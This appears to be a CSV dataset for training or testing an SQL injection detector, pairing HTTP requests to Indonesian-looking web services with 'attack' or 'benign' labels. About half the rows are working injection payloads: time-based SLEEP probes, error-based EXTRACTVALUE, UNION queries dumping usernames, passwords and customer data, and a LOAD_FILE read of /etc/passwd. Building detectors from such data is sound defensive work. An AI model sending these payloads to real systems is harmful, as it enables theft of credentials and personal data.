payload,label
"GET http://api.simpeg-pemkab.id/pegawai?nip=199001012020011003'+AND+(SELECT+*+FROM+(SELECT(SLEEP(3)))a)--",attack
GET http://monitor.waduk-sutami.id/muka-air?tanggal=2024-07-01&status=normal&elevasi=271m,benign
"GET http://backend.direktori-umkm.id/toko?id=TK-881' AND (SELECT 1 WHERE 1=1 AND 0x313D31 AND SLEEP(3))--",attack
POST http://api.simas-bri.id/tabungan?rek=009801234567890&pin=****&tipe=simpedes,benign
"GET http://cms.portal-desa.id/berita?id=221'%20PROCEDURE%20ANALYSE(EXTRACTVALUE(5672,CONCAT(0x5c,(SELECT%20password%20FROM%20admin%20LIMIT%201))),1)--",attack
GET http://dashboard.supply-chain.id/po?po_id=PO-9921&vendor=VND-441&status=approved,benign
"GET http://api.siakad-stiki.ac.id/nilai?nim=1234567' AND IF(ORD(SUBSTR(database(),1,1))>100,SLEEP(3),0)--",attack
GET http://portal.siaran-tvri-jatim.id/jadwal?hari=senin&pukul=19.00&program=berita,benign
"GET http://erp.kontraktor-sipil.id/proyek?pid=PRJ-881' UNION SELECT NULL,NULL,NULL,NULL,LOAD_FILE(0x2F6574632F706173737764)--",attack
POST http://api.siswa-online.id/nilai?nis=2021001&mapel=matematika&semester=2,benign
"GET http://backend.warung-digital.id/menu?id=MNU-441'%20AND%20EXTRACTVALUE(0x0a,CONCAT(0x0a,(SELECT%20GROUP_CONCAT(username,0x3a,password)%20FROM%20users)))--",attack
GET http://monitor.gardu-induk.id/trafo?id=TF-02&region=malang&param=beban,benign
"GET http://portal.kpu-jatim.id/dpt?nik=3573091234560003' AND (SELECT CHAR(114)+CHAR(111)+CHAR(111)+CHAR(116))>0 AND SLEEP(3)--",attack
GET http://api.parkir-rs.id/tiket?tiket_id=TKT-882&lantai=2&status=aktif,benign
"GET http://admin.toko-online-premium.id/order?oid=ORD-9921'/*!50000UNION*//*!50000SELECT*/NULL,CONCAT(nama,0x3a,alamat,0x3a,no_hp),NULL,NULL FROM customer_data--",attack
GET http://dashboard.hr-management.id/karyawan?dept=it&status=aktif&lokasi=malang,benign
"GET http://api.simbg-atrbpn.id/sertifikat?nib=12345678901' AND (SELECT IFNULL(CAST(TABLE_NAME AS CHAR),0x20) FROM information_schema.TABLES WHERE table_schema=database() LIMIT 1,1)>'a'--",attack
POST http://app.manajemen-aset-sekolah.id/inventaris?sekolah_id=SDN-0021&kategori=elektronik&kondisi=baik,benign
"GET http://backend.portal-alumni.id/member?id=ALM-441'%20UNION%20SELECT%20NULL,NULL,NULL,CONCAT(email,0x7c,password_hash),NULL,NULL%20FROM%20users--",attack
GET http://monitor.bts-telkomsel.id/site?site_id=MGL-0441&param=signal&date=2024-07-01,benign
"GET http://api.simantu-pupr.id/jembatan?id=JMB-0021' AND (SELECT CASE WHEN (SELECT SUBSTR(password,3,1) FROM admin LIMIT 1)='m' THEN SLEEP(5) ELSE 0 END)--",attack
